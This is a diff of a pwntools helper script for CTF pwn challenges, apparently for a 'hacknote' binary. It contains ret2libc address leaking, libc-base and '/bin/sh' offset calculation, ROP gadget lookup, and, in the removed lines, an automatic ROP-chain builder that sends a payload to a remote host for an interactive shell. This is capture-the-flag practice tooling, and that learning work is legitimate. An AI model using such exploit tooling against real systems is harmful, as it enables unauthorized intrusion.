@@ -2,15 +2,21 @@ from pwn import *
 from LibcSearcher import *
 import os
 
-dir = 'challenge.basectf.fun:27271'
-file = './pwn'
-libc_target = ''
-host,port = dir.split(':')
+dir = ''
+file = './hacknote'
+libc_target = './libc-2.23.so'
 
 elf_state = True
 libc_state = True
 ps_state = True
 shell = 'chmod +x '+ libc_target
+
+if dir.find(':') != -1:
+    host,port = dir.split(':')
+elif dir.find(' ') != -1:
+    host,port = dir.split(' ')
+else:
+    ps_state = False
 
 try:
     p = remote(host,port)
@@ -67,15 +73,13 @@ def p6(text):
 def p3(text):
     return p32(text)
 
-def data_recv_text():
+def data_recv_test():
     p.recv()
     p.recv()
 
-def data_recv(name,type):
-    if type == 64:
-        data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
-    if type == 32:
-        data = u32(p.recv(4))
+def data_recv(name,type = None):
+    #only ret2libc
+    data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
     answer(name,data)
     return data
 
@@ -83,7 +87,6 @@ def libc_compute(name,name_add,mode = None):
     #only ret2libc
     global system_add
     global binsh_add
-    log.success('https://libc.rip/')
     if libc_state == False or mode != 'local':
         libc = LibcSearcher(name,name_add)
         libc_base = name_add - libc.dump(name)
@@ -99,14 +102,19 @@ def libc_compute(name,name_add,mode = None):
     answer('binsh_add',binsh_add)
 
 def get_binsh_offest():
-    with open('libc.so.6','rb') as file:
-        data = file.read()
-    offest = data.find(b'\x2f\x62\x69\x6e\x2f\x73\x68\x00')
+    shell = 'xxd ' + libc_target + ' |grep "2f 6269 6e2f 7368 00"'
+    data = os.popen(shell).readlines()[0].strip(' ')
+    libc_base,data= data.split(':')
+    libc_base = int(libc_base,16)
+    data = data[1:data.rindex(' ')]
+    out = ''
+    for i in data.split(' '):
+        i = i[:2] + ' ' + i[-2:] + ' '
+        out += i
+    offest = out.index('2f 62 69 6e 2f 73 68 00')//3
+    offest = offest + libc_base
     answer('offest',offest)
-    file.close()
     return offest
-
-# ps_state = False
 
 answer('elf_state',elf_state)
 answer('libc_state',libc_state)
@@ -120,6 +128,7 @@ else:
 answer('done')
 
 def get_rop(name):
+    global result
     if name == 'ret':
         shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ' + name + '"'
     else:
@@ -127,70 +136,11 @@ def get_rop(name):
     try:
         result = int(os.popen(shell).readlines()[0][2:19],16)
         answer(name,result)
-        return result
     except:
         answer('error')
 
-shell = 'ROPgadget --binary ' + './gift' + ' --ropchain'
-
-def rop_attack_basic():
-    data = os.popen(shell).readlines()
-    for i in range(len(data)):
-        if data[i] == 'from struct import pack\n':
-            data = data[i+1:]
-            return data
-
-def rop_attack(padding):
-    data = rop_attack_basic()
-    print('from pwn import *')
-    print('io = remote("'+host+'",'+port+');')
-    for i in range(len(data)):
-        print(data[i],end='')
-    print('padding = ' + str(padding))
-    print("payload = b'a'*padding+p")
-    print('io.recv()')
-    print("io.sendline(payload)")
-    print("io.interactive()")
-
-def rop_auto_attack(padding):
-    data = rop_attack_basic()
-    shell = ''
-    for i in range(len(data)):
-        try:
-            data.remove('\n')
-        except:
-            break
-    for i in range(len(data)):
-        if data[i][0] == '\v':
-            data[i] += data[i][1:]
-        if data[i].find('#') != -1:
-            data[i] = data[i][:data[i].find('#')]
-        if data[i].find('\n') != 1:
-            data[i] = data[i][:data[i].find('\n')]
-        if data[i] != '':
-            shell += data[i] + ';'
-    padding = padding
-    payload = 'payload = ' + str(b'a'*padding) + '+p;'
-    print(payload)
-    shell += payload + 'io.recv();io.sendline(payload);io.interactive()'
-    shell = 'python -c "from pwn import *;io=remote(\'' + host + '\',' + str(port) + ');from struct import pack;'+shell+'"'
-    print(shell)
-    os.system(shell)
-
-def number_hex(number):
-    number_copy = number
-    if type(number) == float:
-        number = int(float(number))
-    if number_copy < 0:
-        number = int(bin(number & 0xffffffff),2)
-    return hex(number)
-
-rop_state = True
-
-if elf_state == True and rop_state == True:
+if elf_state == True:
     shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
     os.system(shell)
 
 context(os='linux', arch='amd64',log_level = 'debug')
-
-
